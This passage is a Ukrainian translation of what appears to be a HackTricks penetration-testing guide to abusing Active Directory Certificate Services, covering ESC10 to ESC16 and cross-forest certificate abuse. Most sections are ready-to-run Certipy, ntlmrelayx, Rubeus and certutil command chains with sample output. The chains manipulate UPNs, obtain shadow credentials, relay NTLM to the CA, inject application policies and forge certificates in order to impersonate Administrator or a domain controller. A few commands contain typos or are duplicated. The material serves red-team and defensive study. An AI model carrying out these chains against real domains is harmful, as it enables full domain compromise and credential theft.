Зауважено, що `userPrincipalName` сертифіката відображає `Administrator`, не містить жодного “object SID”.

`userPrincipalName` користувача `Jane` потім було повернено до її початкового значення, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT hash користувача `Administrator@corp.local`. Команда має включати `-domain <domain>` через відсутність у сертифікаті вказівки домену:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ESC10 стосується двох значень ключів реєстру на контролері домену:

- Значення за замовчуванням для `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` — `0x18` (`0x8 | 0x10`), раніше встановлювалося як `0x1F`.
- Параметр за замовчуванням для `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` — `1`, раніше — `0`.

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` включає біт `UPN` (`0x4`).

### Сценарій зловживання 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A з правами `GenericWrite` може бути використаний для компрометації будь-якого облікового запису B.

Наприклад, маючи права `GenericWrite` на `Jane@corp.local`, атакуючий прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9 і дозволяє використовувати будь-який шаблон сертифіката.

Спочатку hash користувача `Jane` отримується за допомогою Shadow Credentials, експлуатуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Потім у `Jane` було змінено `userPrincipalName` на `Administrator`, свідомо опустивши частину `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього від імені `Jane` запитується сертифікат для клієнтської аутентифікації, з використанням шаблону за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Значення `userPrincipalName` у `Jane` потім відновлюється до початкового — `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Аутентифікація за допомогою отриманого сертифіката поверне NT hash для `Administrator@corp.local`, тому в команді потрібно вказати домен через відсутність відомостей про домен у сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Випадок зловживання 2

Коли `CertificateMappingMethods` містить бітову мітку `UPN` (`0x4`), обліковий запис A з правами `GenericWrite` може скомпрометувати будь-який обліковий запис B, який не має властивості `userPrincipalName`, включно з обліковими записами машин та вбудованим доменним адміністратором `Administrator`.

Тут мета — скомпрометувати `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` користувача `Jane` потім встановлюється як `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується як `Jane`, використовуючи шаблон за замовчуванням `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Після цього процесу значення `userPrincipalName` для `Jane` повертається до початкового значення.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для аутентифікації через Schannel використовується опція Certipy `-ldap-shell`, що вказує на успішну аутентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell команди, такі як `set_rbcd`, дозволяють виконувати атаки Resource-Based Constrained Delegation (RBCD), що потенційно можуть скомпрометувати доменний контролер.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, який не має `userPrincipalName` або коли він не відповідає `sAMAccountName`, при цьому за замовчуванням `Administrator@corp.local` є основною ціллю через підвищені LDAP-привілеї та відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо CA Server не налаштований з `IF_ENFORCEENCRYPTICERTREQUEST`, це дозволяє виконувати NTLM relay атаки без підпису через RPC-службу. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Ви можете використати `certipy` для перевірки, чи `Enforce Encryption for Requests` вимкнено, і certipy покаже вразливості `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: Для контролерів домену потрібно вказати `-template` у DomainController.

Або використовуючи [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Адміністратори можуть налаштувати Certificate Authority так, щоб він зберігався на зовнішньому пристрої, наприклад, на "Yubico YubiHSM2".

Якщо USB-пристрій підключено до CA-сервера через USB-порт, або через USB device server у випадку, коли CA-сервер — віртуальна машина, для Key Storage Provider потрібен authentication key (іноді званий "password") для генерації та використання ключів у YubiHSM.

Цей ключ/password зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, і ви отримали shell доступ, можливо відновити ключ.

Спочатку потрібно отримати сертифікат CA (він публічний), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте certutil `-sign` для підроблення нового довільного сертифіката, використовуючи сертифікат CA та його приватний ключ.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дозволяє додати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, які відповідають за політики видачі, можна знайти в Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов'язати з AD group за допомогою атрибута цього об'єкта `msDS-OIDToGroupLink`, що дозволяє системі авторизувати користувача, який пред'являє сертифікат, ніби він є членом цієї групи. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Іншими словами, якщо користувач має дозвіл на реєстрацію (enroll) сертифіката і сертифікат пов'язаний з групою OID, користувач може успадкувати привілеї цієї групи.

Використайте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть права користувача — можна використати `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має право виконувати enroll на `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Все, що потрібно зробити — просто вказати шаблон, і він отримає сертифікат із правами OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Уразлива конфігурація поновлення сертифікатів — ESC14

### Пояснення

Опис на https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно вичерпний. Нижче наведено цитату оригінального тексту.

ESC14 стосується вразливостей, що виникають через «слабке явне відображення сертифікатів», головним чином через неправильне використання або небезпечну конфігурацію атрибута Active Directory user або computer `altSecurityIdentities`. Цей мультизначний атрибут дозволяє адміністраторам вручну пов’язувати X.509 сертифікати з обліковим записом AD для аутентифікації. Коли він заповнений, ці явні відображення можуть переважати стандартну логіку відображення сертифікатів, яка зазвичай спирається на UPNs або DNS імена в SAN сертифіката, або на SID, вбудований в розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» відображення виникає, коли рядок значення, що використовується в атрибуті `altSecurityIdentities` для ідентифікації сертифіката, є занадто широким, легко вгадується, спирається на неконкретні поля сертифіката або використовує легко підроблювані компоненти сертифіката. Якщо атакуючий може отримати або створити сертифікат, атрибути якого відповідають такому слабо визначеному явному відображенню для привілейованого облікового запису, він може використати цей сертифікат для аутентифікації та імітації цього облікового запису.

Приклади потенційно слабких рядків відображення `altSecurityIdentities` включають:

- Відображення виключно за звичайним Subject Common Name (CN): наприклад, `X509:<S>CN=SomeUser`. Атакуючий може отримати сертифікат з цим CN з менш захищеного джерела.
- Використання надмірно загальних Issuer Distinguished Names (DNs) або Subject DNs без додаткової кваліфікації, як-от конкретний серійний номер або subject key identifier: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Застосування інших передбачуваних шаблонів або некриптографічних ідентифікаторів, які атакуючий може задовольнити у сертифікаті, який він легітимно отримує або підробляє (якщо він скомпрометував CA або знайшов вразливий шаблон, як в ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати відображення, такі як:

- `X509:<I>IssuerDN<S>SubjectDN` (відображення за повними Issuer та Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (відображення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (відображення за серійним номером, неявно кваліфікованим Issuer DN) — зазвичай це не стандартний формат, зазвичай використовують `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (відображення за RFC822 іменем, зазвичай електронною адресою, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (відображення за SHA1-хешем сирого відкритого ключа сертифіката — загалом сильне)

Безпека цих відображень значною мірою залежить від специфічності, унікальності та криптографічної стійкості обраних ідентифікаторів сертифіката, використаних у рядку відображення. Навіть за наявності режимів сильного прив’язування сертифікатів на Domain Controllers (які переважно впливають на неявні відображення, засновані на SAN UPNs/DNS та SID-розширенні), неправильно налаштований запис у `altSecurityIdentities` все одно може створити прямий шлях для імітації, якщо сама логіка відображення є помилковою або надто дозволяючою.

### Сценарій зловживання

ESC14 націлений на явні відображення сертифікатів в Active Directory (AD), конкретно на атрибут `altSecurityIdentities`. Якщо цей атрибут встановлено (за задумом або через неправильну конфігурацію), атакуючі можуть імітувати облікові записи, пред’являючи сертифікати, які відповідають відображенню.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

Передумова: Атакуючий має права запису до атрибута `altSecurityIdentities` цільового облікового запису або має право надати його у вигляді одного з наступних дозволів на цільовому об’єкті AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- Передумова: У цілі є слабке X509RFC822 відображення в altSecurityIdentities. Атакуючий може встановити атрибут пошти жертви (mail) так, щоб він відповідав X509RFC822 імені цілі, оформити сертифікат від імені жертви і використовувати його для аутентифікації як цільовий обліковий запис.

#### Scenario C: Target Has X509IssuerSubject Mapping

- Передумова: У цілі є слабке явне відображення X509IssuerSubject в `altSecurityIdentities`. Атакуючий може встановити атрибут `cn` або `dNSHostName` у жертви так, щоб він відповідав subject відображення X509IssuerSubject цілі. Після цього атакуючий може видати сертифікат від імені жертви і використати цей сертифікат для аутентифікації як цільовий обліковий запис.

#### Scenario D: Target Has X509SubjectOnly Mapping

- Передумова: У цілі є слабке явне відображення X509SubjectOnly в `altSecurityIdentities`. Атакуючий може встановити атрибут `cn` або `dNSHostName` у жертви так, щоб він відповідав subject відображення X509SubjectOnly цілі. Після цього атакуючий може видати сертифікат від імені жертви і використати цей сертифікат для аутентифікації як цільовий обліковий запис.

### конкретні операції
#### Scenario A

Запросити сертифікат за шаблоном сертифіката `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Зберегти та конвертувати сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Аутентифікуватися (з використанням сертифіката)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов'язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш конкретних методів атаки в різних сценаріях зверніться до наступного: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

Опис на https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc надзвичайно детальний. Нижче наведено цитату оригінального тексту.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuse

Нижче наведено посилання на [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Команда `find` у Certipy може допомогти виявити V1 шаблони, які потенційно вразливі до ESC15, якщо CA не оновлено.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Direct Impersonation via Schannel

**Крок 1: Запитати сертифікат, вставивши "Client Authentication" Application Policy та цільовий UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє заявнику вказати subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Вразливий шаблон V1 з "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Вставляє OID `1.3.6.1.5.5.7.3.2` в розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN в SAN для імперсонації.

**Крок 2: Аутентифікуйтеся через Schannel (LDAPS), використовуючи отриманий сертифікат.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Крок 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Цей сертифікат призначений для зловмисника (`attacker@corp.local`), щоб отримати права enrollment agent. Тут не вказано UPN для особистості зловмисника, оскільки мета — здобути саме повноваження агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Інжектує OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.** Це крок, схожий на ESC3-like, де сертифікат з Кроку 1 використовується як agent certificate.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Аутентифікуйтеся як привілейований користувач, використовуючи сертифікат "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Вимкнення розширення безпеки на CA (глобально) - ESC16

### Пояснення

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** стосується сценарію, коли, якщо конфігурація AD CS не вимагає включення **szOID_NTDS_CA_SECURITY_EXT** у всі сертифікати, атакуючий може скористатися цим таким чином:

1. Запит сертифіката **без прив'язки SID**.

2. Використання цього сертифіката **для автентифікації як будь-який обліковий запис**, наприклад, видаючи себе за обліковий запис з високими привілеями (наприклад, Domain Administrator).

Додатково можна звернутися до цієї статті, щоб дізнатися більше про детальний принцип: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Зловживання

Наведене посилання на [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Click to see more detailed usage methods.

Щоб визначити, чи середовище Active Directory Certificate Services (AD CS) вразливе до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитайте початковий UPN облікового запису жертви (необов'язково - для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN облікового запису жертви на sAMAccountName цільового адміністратора.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (за потреби) Отримати облікові дані для облікового запису "жертви" (наприклад, через Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат від імені користувача "victim" з _будь-якого підходящого шаблону клієнтської аутентифікації_ (наприклад, "User") на ESC16-вразливому CA.** Оскільки CA вразливий до ESC16, він автоматично не включатиме розширення безпеки SID у виданому сертифікаті, незалежно від конкретних налаштувань шаблону для цього розширення. Встановіть змінну середовища кеша облікових даних Kerberos (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запросіть сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Повернути UPN облікового запису "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Аутентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Компрометація лісів за допомогою сертифікатів (пояснено у пасивному стані)

### Порушення довірчих відносин між лісами через скомпрометовані CA

Налаштування для **cross-forest enrollment** зроблено відносно простим. **root CA certificate** з ресурсного лісу **публікується в account forests** адміністраторами, а **enterprise CA** сертифікати з ресурсного лісу **додаються в контейнери `NTAuthCertificates` та AIA в кожному account forest**. Для ясності: ця конфігурація надає **CA в ресурсному лісі повний контроль** над усіма іншими лісами, для яких він керує PKI. Якщо цей CA буде **скомпрометований атаками**, сертифікати для всіх користувачів як ресурсного, так і account forest можуть бути **підроблені ними**, тим самим буде зламано межу безпеки лісу.

### Надання прав реєстрації іноземним суб'єктам

У багалісних середовищах потрібно бути обережним з Enterprise CAs, які **публікують шаблони сертифікатів**, що дозволяють **Authenticated Users або foreign principals** (користувачам/групам, які належать до іншого лісу) **права на enrollment та редагування**.\
Після автентифікації через довіру, AD додає **Authenticated Users SID** до токена користувача. Отже, якщо в домені є Enterprise CA зі шаблоном, що **дозволяє Authenticated Users права на enrollment**, цей шаблон потенційно може бути **зареєстрований користувачем з іншого лісу**. Аналогічно, якщо **права на enrollment явно надаються foreign principal у шаблоні**, тим самим створюється **cross-forest access-control relationship**, що дозволяє суб'єкту з одного лісу **реєструватися у шаблоні з іншого лісу**.

Обидва сценарії призводять до **збільшення поверхні атаки** з одного лісу в інший. Налаштування шаблону сертифіката можуть бути використані нападником для отримання додаткових привілеїв у foreign domain.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
